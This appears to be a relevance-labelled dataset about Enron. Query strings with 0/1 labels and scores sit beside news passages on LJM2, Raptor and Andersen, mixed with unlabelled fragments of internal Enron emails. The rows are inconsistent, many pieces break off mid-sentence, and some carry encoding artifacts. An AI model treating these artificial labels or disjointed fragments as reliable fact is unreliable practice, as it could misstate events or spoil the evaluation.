have confidentiality agreements in place and determine those names that we 
have a potential fiduciary responsibility.  The latter obviously will not be 
black and white but hopefully we can make some progress.  I would expect that

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"As a result of the restatements made Thursday, Enron said 2000 recurring earnings per share was $1.33, compared with the originally reported $1.47. But if the $501 million of LJM2-related losses were included, Enron only made 88 cents in 2000. If the $453 of losses were included in profits calculation for the first nine months of 2001, Enron actually made 98 cents per share, instead of the restated $1.36. What is the basis for including these LJM2 losses when Enron doesn't? Well, Enron says in the Thursday press release that LJM1 was consolidated into the restatement ""because of inadequate capitalization."" It later says that it believes that initial capital commitments for LJM1 totaled $16 million, whereas the ""aggregate capital commitments to LJM2 were $394 million."" Trimming the HedgesThe LJM2 number is certainly larger, but in and of itself the equity number means little when you look at sheer size of the deals LJM2 and Enron did together. Enron asked LJM2 for protection against swings in the value of broadband and other assets. These so-called hedging deals were struck through specially-formed entities collectively known as Raptor, according to Thursday's press release. Through the Raptor deals, LJM2 agreed to make Enron whole for losses sustained if the assets declined in value, and it hoped to profit if these assets went up in value. Enron SEC filings show that the notional value of these Raptor hedges was a sizable $2.1 billion. However, to make hedges of this size, Raptor would've needed adequate cushion against potential losses. The value of the equity LJM2 put into Raptor hasn't been disclosed. But it appears Enron took a radical step to give Raptor the cushion it needed. Enron seemingly created assets for Raptor to make it big enough to handle the hedges. From what can be pieced together from Enron disclosure, the company did that by agreeing to issue stock valued at $1.2 billion to Raptor under certain conditions. This stock pledge essentially served as Raptor's assets; in return, Enron took a note receivable, or simply a loan, from Raptor for $1.2 billion. As it happened, Enron benefited massively from the assets hedge. It protected itself against a $500 million decline in the assets in 2000 and $453 million in 2001. These hedging gains were netted out to zero in Enron core earnings, because they were offset by declines in asset values. But without the hedges, Enron would've taken the losses in its expense line.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Operating without a net -- or a watchdog -- Enron trotted into one of the world's most complex financial arenas and made a colossal, billion dollar mess, inserting risk into a market designed specifically to avoid it. According to Standard & Poor's, the credit rating agency, Enron's collapse has thrown at least $3 billion worth of credit derivatives contracts into limbo. So far, Enron's bankruptcy hasn't set off a wider financial panic, but according to some experts, the credit derivatives fiasco nevertheless reveals larger systemic problems. The company's push into credit derivatives not only proves that it's possible to dupe some of the best financial minds in the world, but it also exposes potentially dangerous loopholes in the U.S.'s financial regulatory system. The SEC regulates the investment banks that typically dominate credit derivative trading. But Enron wasn't a bank -- so it escaped supervision. Because derivatives markets are easy to enter and disclosure rules are weak, some experts believe that it's only a matter of time before another rogue derivatives player surfaces, fails and sends even greater shock waves through the system. ""There are other potential time bombs ticking,"" says Michael Greenberger, a law professor at the University of Maryland and the former director of trading and markets at the Commodity Futures Trading Commission (CFTC). ""We don't know how many other companies like Enron are out there."" The term ""derivatives"" is used to describe a class of financial contracts that are derived from another asset and priced according to that asset's value. Also known as a form of ""risk management,"" over the past 20 years derivatives trading has become increasingly popular on Wall Street as a way to ""hedge"" risk; to protect yourself from an investment bet that goes sour or from swings in interest rates or currency prices. Over the course of those 20 years, the debate on whether to regulate such trading has been one of the more abstruse battlegrounds between Washington and Wall Street -- and Enron has been a major player in that fight. One of the first derivatives to gain popularity in the newly deregulated financial markets of the 1980s was the ""interest-rate swap,"" which takes its value from underlying loans. Interest-rate swaps allow a bank that has, for example, a majority of variable rate loans to protect against the risk of falling interest rates -- which would decrease borrowers' payments and thus bank profits -- by ""swapping"" the loans for fixed rate debts held by another bank. The actual loans never change hands; the contract allows the banks to trade only the interest-rate risks, with the price of the deal being determined by the size of the loans and the probability of interest-rate fluctuations. If it looks like the Federal Reserve will raise rates, the fixed-rate bank will pay a higher premium. But if the Fed signals a cut, the bank with a high level of variable rate loans will pay a larger fee.",0.0,0.0,0.8,0.2

Hi  Chris,

Following a meeting today to discuss the forward  plan, the decision has been 
made to shelve the VAR course in it's current  format. An?re-run of the 
previous event has been agreed. There have been  a number of events that were 
to be re-researched and radically altered, but  with the number of new events 
on the schedule, producer time and budgets have  been taken up by the larger 
conferences. 
?
I  would like to apologise for the inconvenience this may have caused. I will 
be  responsible for a number of events on credit risk management, real 
options  theory, exotic options and weather risk management in the second 
half of the  year and will send a calendar to give more notice for these 
events. Victoria  Kerridge will be producing our largest annual energy event 
in Europe and I  have forwarded your details for a possible presentation and 
post-conference  seminar opportunity. If you have any questions please drop 
me a  line.

Best  wishes,

I have a favour - Jon McKay of our office is wondering if you have any record 
of a deal with TMG Financial Products Inc. that is a one-off transaction 
dealing with ""credit sleeving""?

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Enron reported more than $16 billion in gains from derivatives over the three years to 2000, Partnoy said. He said the alleged false entries ""were systematic and occurred over several years, beginning as early as 1997."" Partnoy said some Enron traders had misused so-called ""prudency reserves,"" meant to reflect the inherent uncertainty about future profits from derivatives deals, as rainy-day funds to smooth out their profits and losses over time. Some had also apparently deliberately misvalued the forward rate curves used to determine the current value of their derivatives portfolios in order to hide losses, he said. ""I cannot offer fact testimony as to any of these matters,"" Partnoy told the committee. ""Nonetheless, I strongly believe the information I have gathered is credible. It is from many sources, including written information, e-mail correspondence and telephone interviews."" At least eight congressional committees, as well as the Securities and Exchange Commission and the Department of Justice, are probing Enron's fall from grace and Partnoy said the episode should raise major questions about the regulation of derivatives as well as capital markets in general. ""The collapse of Enron makes it plain that the key gatekeeper institutions that support our system of market capitalism have failed,"" he said. ""The institutions sharing the blame include auditors, law firms, banks, securities analysts, independent directors and credit rating agencies.""",1.0,0.8,0.9,0.0

As stated below our internal sales efforts now support the conclusion that the prior year write down was more than it should have been. This would suggest that we need to effectively adjust the write down of the asset to reflect what we truly believe is collectible. This will be considered a change in accounting estimate will flow through the current quarter earnings if management makes the decision that this asset was incorrectly written down in the prior year. This basically gets you the the same accounting treatment as MTM.A few things need to be noted:1) Support will need to be provided that substantially supports the adjustment of our valuation of this asset. Please provide this to me 2) You will have to resolve the geography of the income that results from the increase in the asset.

mark to market accounting practices,0,"Subject: Rick,With the recent burst of the Internet and communications bubble in the public equity markets, I wanted to send you an email describing our position, exposure and ongoing strategy. Our aggressive use of accounting management vehicles, and early sales of positions has significantly reduced our accounting volatility and economic exposure. Hopefully, the following points will address the appropriate issues.Currently we have invested $108 million in 22 companies. Of that, approximately $80 million still has accounting exposure. The other $28 million invested has either been hedged or already written down. Our disciplined use of Fair Value accounting has allowed us to minimize accounting risk by not writing up investments simply because of improving market conditions.Specifically - Avici, Sycamore, and FastForward have generated approximately $180 million in earnings this year. DEN, Salus Media, and IAM.com have combined for $9 million in writeoffs.Recently, I have done a review of our portfolio and I believe our accounting loss exposure for 2001 is limited. Over 80% of our portfolio companies have raised enough capital to sustain them through all of 2001. So, if the markets (private and public) are closed, I do not believe these companies will risk bankruptcy during 2001. Also, our discipline of only co-investing with big partners helps assure these companies will continue to get funding.Going forward, we are making certain revisions to our strategy to take compensate for, and take advantage of, the weak markets.Limiting venture investments to technology companies that we have a competitive advantage in assessing the technology risk. Also, moving our venture effort earlier stage to take more technology risk and less market risk.We are beginning to look at other types of private equity investments. There are many public companies, whose stock prices are at 10% or less of their highs. I still believe that the fundamentals of the industries indicate that the vast majority of these companies will go bankrupt. However, there will be a select few that will survive and will end up with reduced competition and big markets. These companies will be big winners. We are carefully looking for these. I will keep you informed as this develops.If you have any other questions, please let me know.Thanks,Kevin Garland",0.0,0.2,0.7,0.0

mark to market losses,0,"Monday's action: Stocks closed broadly lower in light trading Monday, as investors awaited several key economic reports due out this week, including Friday's scheduled report on job losses and the unemployment rate in October. Treasury securities rallied on expectations that the economic downturn will be more pronounced and longer than many investors believe and will prompt the Federal Reserve to cut interest rates through the end of the year. The Dow Jones industrial average fell 275.67 points, or 2.9 percent, to 9269.50. Chicago-based Boeing, which lost a major defense contract to rival Lockheed Martin, led the Dow losers. Boeing lost $3.93, or 10.4 percent, to $33.75. Only one of the 30 Dow industrials, SBC Communications, posted a gain. The broader Standard & Poor's 500 index dropped 26.31, or 2.4 percent, to 1078.30. New York Stock Exchange trading volume reached 1.11 billion shares, as losing stocks outnumbered winners by 2-1. The Nasdaq composite index fell 69.44, or 3.9 percent, to 1699.52. Nasdaq trading volume totaled 1.67 billion shares. Losers topped winners by nearly 2-1 among Nasdaq stocks. Computer networking giant Cisco Systems led the Nasdaq most- active list, dropping 87 cents, to $16.42. A.G. Edwards revoked its ""strong buy"" rating on the stock. The Russell 2000 index of small-company stocks lost 9.24, or 2.1 percent, to 429.41. Fund flows: Mutual fund investors withdrew a net $29.5 billion from equity funds in September, the biggest one-month dollar amount for net redemptions, according to the Investment Company Institute, the trade association for mutual funds. The redemptions equaled less than 1 percent of assets in stock funds, compared with more than 3 percent withdrawn in October 1987, reflecting the stock market crash of that month. By contrast, cash flow last month into money-market funds soared by $53 billion. Treasury auction: Interest rates fell again at the Treasury's weekly auction of 3-month and 6-month bills. The discount rate for 3-month bills was 2.05 percent, the lowest rate since August 1958. The rate for 6-month bills was 2.00 percent, the lowest rate on record. The coupon-equivalent investment rates at Monday's auction were 2.09 percent for 3-month bills and 2.05 percent for 6-month bills. Bill Barnhart",0.0,0.0,0.0,0.0

WORLD STOCK MARKETS - Wall St trims its losses on word from Fed.By MARY CHUNG.11/07/2001Financial Times(c) 2001 Financial Times Limited . All Rights ReservedUS stocks trimmed their their losses, immediately following the Federal Reserve's decision to lower short-term interest rates by 50 basis points yesterday. Wall Street had widely expected the central bank to cut rates for the 10th time this year to help stimulate the US economy. But the decision by the Fed policymakers to cut by more aggressive 50bp lowering the federal funds rate to 2 per cent following a recent rash of grim economic data bolstered the market. In late trading, the Dow Jones Industrial Average was off 9.82 at 9,431.21 and the S&P 500 index 2.25 at 1,100.59. The Nasdaq Composite gained 1.41 at 1,795.06.Cisco Systems offered some cheer and earlier bolstered the technology sector after the networking company reported sales and earning above Wall Street forecasts and said the downturn in the sector may have bottomed. Several analysts, encouraged by Cisco's earnings performance, raised their rating on the company. Shares rose 2.4 per cent at $18.33 while rival Juniper Networks slipped 2.6 per cent at $22. Microsoft edged slightly higher, up 0.1 per cent at $63.34, as six of the 18 states suing the software company said they opposed the Justice Department-backed settlement but would consider continued talks with the company. Shares in leading technology stocks were mixed as Oracle and Ciena dipped while Intel and Sun Microsystems gained. Metropolitan Life dipped 0.4 per cent at $27.80 after the largest US public life insurer reported lower third-quarter earnings. Walt Disney was the biggest loser on the Dow, down 4 per cent at $18.39 after Goldman Sachs downgraded the stock, citing an anticipated decline in Disney's fiscal September 2002 earnings and the lack of a sustainable near-term catalyst. Goldman also said: ""Despite the box office success of Monsters, 2002 earnings are under particular pressure at Disney World and the broadcasting division."" Pixar Animation, the company that co-produced the hit movie, continued its decline, down 1.6 per cent at $34.40 following a downgrade by Prudential Securities earlier this week. The energy sector saw the heaviest losses with ExxonMobil down 2 per cent at $38.61 and Enron, the embattled energy trading company, off another 11 per cent at $9.93. Toronto was little changed in early trading as investors awaited news of the US Federal Reserve's interest rate intentions. At midsession the S&P 300 composite index was virtually all square at 7,076.80. Nortel Networks added 35 cents at C$10.34. (c) Copyright Financial Times Ltd. All rights reserved.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"The raw numbers may all be there. But ""any objective person would be hard pressed to understand the effects of these disclosures on the financial statements,"" says Douglas Carmichael, an accounting professor at Baruch College in New York. ""The quality of the disclosure is low, which creates uncertainty about the quality of their accounting."" Further, he says, Enron's explanation of why it entered the transactions ""seems to defy imagination."" In the year-end financial statement, Enron said the purpose was ""to hedge certain merchant investments and other assets,"" a category that includes energy assets whose values are prone to wide price fluctuations. Yet the disclosure shows that Enron chose to use shares and options of its own stock as its chief hedging instrument, even though their price movements wouldn't appear to be directly related to the value of the investments Enron was trying to hedge. ""I don't see how that possibly hedges any of Enron's risks or assets,"" Mr. Carmichael says. Indeed, the disclosures have given rise to widespread speculation that Enron's actual purpose was to use its off-balance-sheet transactions to shift losses off its books to avoid running them through its income statement. Asked whether that was Enron's purpose, Ms. Denne declines to comment. She says Enron stands by its earlier statement that Enron was trying to hedge certain investments. To date, Andersen hasn't been named as a defendant in any of the numerous shareholder lawsuits filed against Enron, which paid Andersen $52 million last year, including $25 million in audit fees. Enron's woes come during a year already filled with embarrassments for Andersen. In June, the SEC fined Andersen and three partners $7 million over their audits of Waste Management Inc.'s financial statements, the largest SEC fine ever against an accounting firm. Andersen, which neither admitted nor denied the SEC's fraud allegations, paid $75 million in 1998 to settle its portion of a shareholder lawsuit over the Houston-based garbage hauler. Also this year, without admitting wrongdoing, Andersen agreed to pay $110 million to settle a shareholder lawsuit over audits it conducted for Sunbeam Corp.

I am commited to ensuring that the retail risk management organization is offered all the tools, information, systems, competitive pricing, etc. to allow EES to offer fully bundled competitively priced products to retail customers.

I look forward to working with you and Dave in continuing to grow this business.",0.0,0.0,0.8,0.2

Subject: SCE - Investment Banker Conference Call

SCE held a conference call this morning to discuss the  Memorandum of 
Understanding (MOU) related to the sale of its transmission assets with 
members of the investment community.  After a  brief description of major 
provisions of the MOU, questions were taken.  Following is a summary of that 
call.

Major Components of Plan (repeatedly referred to as the ""Governor's Plan"")

Maintains cost-of-service treatment for utility retained generation for 10 
years
Sale of transmission assets (or other assets) to CDWR
Dedication of the ""Sunrise"" generation project to cost-of-service based rates 
for 10 years ($2 mm penalty if not on-line by August)
Provision of easements and potential conveyances in fee of certain lands (at 
two hydro projects)
Provides for full recovery of $3.5 B utility net underrecovery as of 1/31/01
Commits SCE to spend $3 B in capital expenditures over 5 years
Dismissal of federal lawsuits by SCE
SCE will resume traditional utility procurement obligations by 1/1/03, 
assuming CDWR contracts and entering into new purchase contracts as necessary

It was stressed that the MOU was a comprehensive plan to be treated as an 
integrated package.  While the CPUC and members of the legislature were 
involved in various stages of the negotiation, the agreement is technically 
between SCE and CDWR.  Various regulatory and legislative approvals are 
necessary for implementation of the MOU.  SCE has rights to terminate the MOU 
if the CPUC  has not adopted specified ""im",0.0,0.0,0.7,0.2

As I likely will not return to the office until just at the time of September close, I thought it might make sense for you, with Brent's assistance, to make sure that the appropriate reporting personnel are notified of the tax adjustments that should be made to book these transactions.Each of the ""top tier"" Raptor entities (Harrier, Roadrunner, Pronghorn, and Grizzly) ""purchased"" from LJM the membership interest that LJM owned in the ""bottom tier"" Raptor entities (Talon, Bobcat, Porcupine, and Timberwlf, respectively). Harrier paid $6 mil, Roadrunner and Grizzly each paid $15 mil, and Pronghorn paid $1,000. As a result of these transactions, the purchased entities became book consolidated with Enron. Also as a result of these transactions, a total book loss of around $600 mil was recorded (divided among the books of each one of the four structures). For tax purposes, the purchasing and purchased entities are all disregarded entities of Enron Corp. (or EES, in the case of Pronghorn and Porcupine). The repurchases are to be treated as merely a final payment made by Enron Corp. (or EES, as the case may be) on a contingent debt instrument. Accordingly, the entire book loss should be reversed for tax, and instead an interest deduction recorded on the tax books of each purchasing entity for the amount that was paid to purchase the bottom tier entity. For examply, Harrier will record an interest expense deduction for $6 mil. We have not been told yet exactly how the book loss will be spread among the four structures, and whether it will be booked on the top tier or bottom tier entities' books. Ron Baker likely will have an answer on this issue by the time you see this message. Please leave me a voice mail if you need assistance before I return to the office on October 10. Thanks!

Federal Trade Commission (FTC) market concentration analyses and that FERC 
should follow the lead of anti-trust enforcement officials, who could also 
analyze mergers faster and more confidentially. He also stated that FERC 
should review the filings after the DOJ or the FTC review them, not before, 
and that there should be a definite time frame for review.  Hebert did 
mention that he was pleased that RTOs and the disposition of transmission 
assets would be exempt, that ancillary services would be considered as a 
separate product and that the Final Rule opens the door for alternative 
market analysis.

Comm. Breathitt supported the Final Rule, stating that it should expedite the 
approval process and that the regulatory burden should be eased due to the 
fact that older, irrelevant requirements have been dropped.  She indicated 
that the Final Rule balanced the need for speedy decisions while protecting 
the public interest by stating that the process will be ""efficient yet 
sufficient"".  The Commissioner said that she was pleased the Final Rule 
addressed technical issues such as computer modeling as well as retail 
competition and one of her main concerns, confidentiality.

Comm. Massey fully supported the Final Rule, emphasizing that it would 
improve response time, lessen the need to ask for more data and allow the 
industry to better predict Commission actions.  Like Commissioner Breathitt, 
Massey was pleased that the Order will allow market modeling analysis that 
will better enable FERC to evaluate market concentration and allow applicants 
to point to other factors when concentration appears too high.  Massey also 
stated that the new Rule includes the ability to address many of FERC's 
concerns, such as future mergers when they occur in succession, retail 
competition, mitigation by the enlargement of markets through RTOs and 
analysis of ancillary services.  In sum, he averred that the Order will 
provide FERC with the tools it needs for accurate analysis, while taking into 
consideration the rapid changes in the industry.

Chairman Hoecker also voiced his support and noted that he felt that this was 
a very important Rule.  In response to Comm. Hebert, Chairman Hoecker said 
that the DOJ and FTC actually wait for FERC's report before issuing their 
own, that the anti-trust enforcement agencies rely on FERC's expertise when

Enron's Executive Management and Board of Directors are committed to this objective.A new group, Accounting Controls and Procedures, has been established to provide centralized management in meeting this responsibility.Accounting Controls and Procedures will report directly to Dick Lydecker, Enron's Chief Accounting Officer, and will be led by Rick Carson.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"At last, someone in the sordid Enron Corp. scandal seems to have done the r=ight thing. Thanks to whistle-blower Sherron S. Watkins, a no-nonsense Enro=n vice-president, the scope and audacity of the accounting mess is becoming= all too clear. Her blunt Aug. 15 letter to Enron CEO Kenneth L. Lay warns =that the company might ``implode in a wave of accounting scandals.'' And no=w that her worst fears have been realized, it is also clear that Watkins' l=etter went far beyond highlighting a few accounting problems in a handful o=f off-balance-sheet partnerships. Watkins' letter lays bare for all to see =the underbelly of Enron's get-rich-quick culture.=20Watkins, 42, a former Arthur Andersen accountant who remains Enron's vice-p=resident for corporate development, put her finger on the rot: top execs wh=o, at best, appeared to close their eyes to questionable accounting maneuve=rs; a leadership that had lost sight of ordinary investors and the basic pr=inciples of accounting; and watchdogs--the outside auditors and lawyers who=se own involvement may have left them too conflicted to query the nature of= the deals. Perhaps the question shouldn't be how Enron collapsed so quickl=y--but why it didn't implode sooner.Lay's response to Watkins' complaints is nearly as damning as her letter it=self. Yes, he talked to her for an hour. And, yes, he ordered an outside in=vestigation. But contrary to Watkins' advice, he appointed the company's lo=ngtime Houston law firm, Vinson & Elkins, despite the obvious conflict: V&E= had worked on some of the partnerships. And Enron and V&E agreed there wou=ld be no ``second-guessing'' of Andersen's accounting and no ``detailed ana=lysis'' of each and every transaction, according to V&E's Oct. 15 report. T=he inquiry was to consider only if there was new factual information that w=arranted a broader investigation. V&E declined comment.=20Surprise: V&E concluded that a widespread investigation wasn't warranted. I=t simply warned that there was a ``serious risk of adverse publicity and li=tigation.'' And Watkins' letter reveals the inadequacy of Lay's response in= the months following CEO Jeffrey K. Skilling's sudden Aug. 14 resignation =for ``personal reasons.'' His departure triggered the letter. Lay never ful=ly disclosed the partnerships or explained their impact to investors, even =as he vowed there were no accounting issues and ``no other shoe to fall.'' =Even after Enron revealed on Oct. 16 a $1.2 billion hit to shareholder equi=ty related to the partnerships, Lay continued to express ignorance about de=tails of these deals and support for Chief Financial Officer Andrew S.

But on Oct. 24, Fas=tow was removed from his job and promptly left the company.=20Watkins, an eight-year Enron veteran, is not some disgruntled naysayer who =is easy to dismiss. Her lawyer, Philip H.

Indeed, the whole yieldcurve was in the green by midday with the short endoutperforming its longer-term counterparts, even though stockswere enjoying a strong rally of their own. Data on both consumerconfidence and a regional measure of manufacturing activityshowed much larger-than-expected declines, which bode poorly forthe economy and suggested that activity in manufacturing may nothave hit bottom yet. The data suggested to some that the Fed mayhave to be more aggressive than previously thought. Others,however, felt that the data was weak, but would just add to theFed's resolve to continue on its expected path of cuttinginterest rates by 25 basis points at its next meeting in August.----------------------------------------------------------------CURRENCY SUMMARY",0.0,0.0,0.7,0.2

record keeping accounting practices,0,"The BBA has joined other banks across Europe in condemning a plan unveiledlate last year by the Joint Working Group, a body made up mainly ofaccounting standard-setters from the world's biggest economies. Theproposals, which are being considered by national standard-setting bodiesand the European Commission, will make companies adjust earnings to takeaccount of rises and falls in the values of financial instruments such asderivatives and loans to customers.The BBA conference includes contributions from the chief accountants ofHSBC, BNP Paribas and Barclays Bank, none of whom is expected to speakfavourably about the proposals.The banks say it is unfair to make them account for changes in the values ofinstruments such as long-term customer loans, which are rarely traded andgenerally held to maturity. They are worried that sharp changes in interestrates would lead to dramatic changes in banks' accounts and confuseconsumers.Banks argue the swings could put them at risk of breaching solvencyrequirements set by regulators, forcing them to withdraw from lending thatcaused volatility even though it was safe.The standard-setters who produced the plan say it should help investors byrevealing large liabilities that remain concealed under traditionalaccounting rules.Prospects for Quick Resolution of Japan'sBad Loan Problem Dim; Study Panel UrgedBNA - May 24, 2001By Toshio AritakeTOKYO--With barely a month left before the Diet (parliament) adjourns inlate June, Japanese Prime Minister Junichiro Koizumi's international pledgeto settle the bad loan problem of banks in two years appears to havestalled.Minister in Charge of Financial Services Hakuo Yanagisawa May 17 met TakashiImai, chairman of the powerful Keidanren (the Federation of EconomicOrganizations of Japan) that represents all top Japanese companies.Yanagisawa asked for Keidanren cooperation and proposed the establishment ofa joint study panel of Keidanren and Zenginkyo (the Federation of BankersAssociations of Japan) to examine early bad loan disposal, a FinancialServices Agency official said May 21.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"In addition, an executive at another energy company that talked to Enron about buying the MTBE assets claims they're worth $50 million at most; he claims Enron has long been trying to sell them for around $150 million. Put bluntly, did Enron stuff EOTT with overpriced assets to meet earnings expectations? An Enron spokeswoman responds: ""EOTT views buying these assets as an expansion from its core business. It makes good business sense."" And a recent EOTT SEC disclosure states that EOTT's audit committee, made up of three directors who aren't employees or officers of any Enron affiliate, as well as an investment bank, judged the sale price to be fair. However, the chairman of the audit committee, Daniel Whitty, is a director for two other Enron subsidiaries. He declined to comment on the deal. A person familiar with Enron's business adds that it was EOTT that wanted to get the deal done before the end of the second quarter so it could include the assets in third-quarter numbers. This person also says the gain was ""immaterial"" to Enron's second-quarter numbers, since there wasn't a big difference between the fair value the assets were marked down to and the price at which they were sold. Most important, this person insists, the $120 million price isn't based only on the assets sold. EOTT is also paying for a contract with Enron that gives EOTT 10 years' worth of MTBE-related business. What's more, Enron has agreed to retain the price risk associated with the commodities involved in MTBE production, this person states. Whatever the case with the MTBE assets, Enron would go a long way toward fulfilling Lay's promises of glasnost by breaking out asset-sale gains.

Please note that you will need to reverse the book loss recorded on the upper tier entities (Harrier, Roadrunner, Pronghorn and Grizzley) for the purchase of the lower tier entities in the amount of about $600 million. In place of the reversal of the book loss, you should record a tax Schedule M to deduct the same (about $600 million) of interest expense. I am working with Essie to determine which entities will report how much of the $600 million purchase price. Thanks, John. -----Original Message-----Subject:FW: Raptor unwind tax accountingFYI -----Original Message-----Subject:Raptor unwind tax accountingEssie:The purpose of this message is to communicate to you, for co-ordination with the appropriate ""MARC"" personnel, the relevant facts of the transactions that closed on Friday, September 28, to unwind the Raptor structures. As I likely will not return to the office until just at the time of September close, I thought it might make sense for you, with Brent's assistance, to make sure that the appropriate reporting personnel are notified of the tax adjustments that should be made to book these transactions.Each of the ""top tier"" Raptor entities (Harrier, Roadrunner, Pronghorn, and Grizzly) ""purchased"" from LJM the membership interest that LJM owned in the ""bottom tier"" Raptor entities (Talon, Bobcat, Porcupine, and Timberwlf, respectively). Harrier paid $6 mil, Roadrunner and Grizzly each paid $15 mil, and Pronghorn paid $1,000. As a result of these transactions, the purchased entities became book consolidated with Enron. Also as a result of these transactions, a total book loss of around $600 mil was recorded (divided among the books of each one of the four structures). For tax purposes, the purchasing and purchased entities are all disregarded entities of Enron Corp. (or EES, in the case of Pronghorn and Porcupine). The repurchases are to be treated as merely a final payment made by Enron Corp. (or EES, as the case may be) on a contingent debt instrument. Accordingly, the entire book loss should be reversed for tax, and instead an interest deduction recorded on the tax books of each purchasing entity for the amount that was paid to purchase the bottom tier entity. For examply, Harrier will record an interest expense deduction for $6 mil. We have not been told yet exactly how the book loss will be spread among the four structures, and whether it will be booked on the top tier or bottom tier entities' books. Ron Baker likely will have an answer on this issue by the time you see this message. Please leave me a voice mail if you need assistance before I return to the office on October 10. Thanks!

The routine cashing =in of stock options that were about to expire by key executives was portray=ed in the media as a fire sale.

RANDOM,0,"Subject: Citygate Production GAS behind TCO - PLEASE READ

Kathy, we may need Colleen Sullivan's interpretation of behind the citygate 
production. Back in January, Noel Bartlo told me these deals stayed with CES 
Retail. John Singer believes the deals stay with him at Enron. If these deals 
stay with Enron, should they be at EES... since they are behind the citygate 
or do they stay with Enron to reduce the TCO delivery to the citygates for 
CES?  This could be a can of worms. 

Colleen, what is the contract interruption? Does the citygate production 
deals stay with Enron? If they stay with Enron, then does CES realize this? 
Are the producers receiving two payments, one from Enron and one from CES. 
Maybe this has already be discussed and decided, but I haven't heard the 
official word.

Currently these citygate production deals are deducted from the citygate 
delivery that CES needs. The numbers that Herndon LDC schedulers provide to 
Enron are reduced by the production. I think Chris put these buy/sells in the 
system to appease John and keep the Enron accounting system whole. Currently 
the market demand tickets in Sitara are reduced by the citygate supply. The 
pathing could be made easier by hooking up the citygate production supply to 
the market demand tickets, but the market demand numbers need to be 
increased. Then you could eliminate the buy/sell tickets that Chris Germany 
has been creating.

However if this production gas is not Enron's, then Enron is creating a lot 
of unnecessary work and the producers are probably receiving two payments.

Hey guys, I wanted ya'll to see the below messages as well since these are 
TCO deals.  I'm little confused now, because Wade had informed me that these 
were all deals behind the citygate that John Singer had been doing and that 
CES retail was pulling gas directly from these points.  We found a few like 
this on CNG last week.  The way we have been handling this is to show a buy 
from whomever at the citygate and hook it up as a buy/sell with CES retail.  
Chris has been setting up the tickets for the sell to CES retail, but right 
now he's priorities are just a bit different.  I guess why I'm a little 
confused on these is that when I pulled up the Phoenix Dominion it has the 
pool attached to the deal and not one of the CPA's.

Carole Migden indicated that they were going to meet again on Tuesday.  I
followed up with Keith prior to Appropriations and he was very disappointed
that he and Bill Leonard could not round up more votes. They knew the
liberals would make a play and thought on a policy level they were better
off pushing a better bill than allowing a bad bill to go through along party
lines.  However, Republicans are well aware of the polling and think this
issue is better left to the Democrats.  Perhaps the liberal play will
energize Republican members.  As for moving to the left, it did not appear
as if Hertzberg was moving left because the amendments seemed to be offered
without his consent which is why the hearing was stopped so abruptly.  If in
fact they are going to stay left and the amendments they presented this
morning wind up in the bill, what does Enron think?  I have already
forwarded the DA amendments to Jeff, Jim and Mike Day.  I will send the
additional amendments momentarily.

The Assembly Appropriations Committee canceled the SBX2 78 hearing
mid-way
through the presentation by Senator Polanco.  As Hedy indicated before,
with
the Republicans not willing to vote for the bill, liberal Democrats
crafted
11 new amendments which they felt were necessary in order to garner
their
votes.  Clearly there was no consensus among committee members or
leadership
on the amendments in question and the business community was up in arms.
Amid the confusion, Hertzberg effectively ordered the hearing canceled.
They intend to hear the bill again on Monday.

Business; Financial Desk Accounting Firm Fine a Record Probe: Arthur Andersen agrees to pay $7 million civil penalty in case involving audits of Waste Management.From Reuters 06/20/2001 Los Angeles Times Home Edition C-3 Copyright 2001 / The Times Mirror Company WASHINGTON -- Accounting giant Arthur Andersen agreed to pay $7 million to settle charges it filed false and misleading audit reports of Waste Management Inc. in which the No. 1 U.S. trash-hauler overstated income by more than $1 billion, federal regulators said Tuesday. The fine was the largest-ever civil penalty against a Big 5 accounting firm, said the Securities and Exchange Commission in announcing the settlement against Arthur Andersen and four of its current or former partners.Publicly traded companies are required to hire an accounting firm to go over books using generally accepted accounting principles. The firms are supposed to raise any concerns with management and issue opinions about the audits. Arthur Andersen, which did not admit or deny the SEC charges, examined Waste Management's books from 1992 through 1996, and issued audit reports that falsely claimed that the statements had been prepared using generally accepted standards, the SEC said. The agency added that the Waste Management financial statements that Arthur Andersen blessed had overstated the Houston-based trash company's pretax income by more than $1 billion. ""Arthur Andersen and its partners failed to stand up to company management and thereby betrayed their ultimate allegiance to Waste Management's shareholders and the investing public,"" said Richard Walker, the SEC's top cop. In addition to the $7-million fine, Arthur Andersen agreed to what the SEC said was the first anti-fraud injunction in more than 20 years against an accounting giant. It also agreed to be censured. ""This settlement allows the firm and its partners to close a very difficult chapter and move on,"" Chicago-based Arthur Andersen said in a statement. ""The allegations underlying the settlement are limited to one client and reflect work that is in some cases more than seven years old,"" it added. Arthur Andersen has served as Waste Management's auditors since before it became a public company in 1971. The company merged in 1998 with USA Waste Services Inc., and the surviving entity took the Waste Management name. Arthur Andersen still audits its books, a Waste Management spokeswoman said. The company said in a statement that Tuesday's settlement stemmed from an SEC investigation of the ""old"" Waste Management's 1998 restatement of annual financial documents from 1993 through 1996 that were audited by Arthur Andersen.Business; Financial Desk BRIEFLY / ACCOUNTING Andersen to Settle Sunbeam Shareholders' Suit Associated Press 05/02/2001 Los Angeles Times Home Edition C-4 Copyright 2001 / The Times Mirror Company",0.0,0.0,0.9,0.6

Subject:	RE: California Rate Exposure



I changed the following:

1. Reduced total load from 185,000 GWh to 178,000 GWh.
2. Allocated the ""costs"" by utility based on total demand
3. Changed the DWR negative MTM on contracts from $7.5B to $9.55B
4. Added an undercollection of $.932 Billion for SDG&E (more below)

I did not:

1. Add the Nuclear decommissioning as it is funded on balance sheet.


I added the following:

1. Allocated the Bonds and Contracts on DWR share of Revenue Requirement %.
2. The CTC is the softest assumption.   The utilities wrote off considerable Transition Revenue Account (undercollection) and Transition Cost Balancing Account Balance (primarily stranded cost) at year end.  The Regulatory Asset for PG&E and Edison is assumed to be primarily TCBA at 6-30-01, but there is no footnote to absolutely corroborate this.   The Undercollection for SDG&E is assumed at the Regulatory Asset balance at 6-30-01.   This is due to the rate freeze having ended for SDG&E and therefore their TCBA should be recovered (reduced to zero). 

Results:

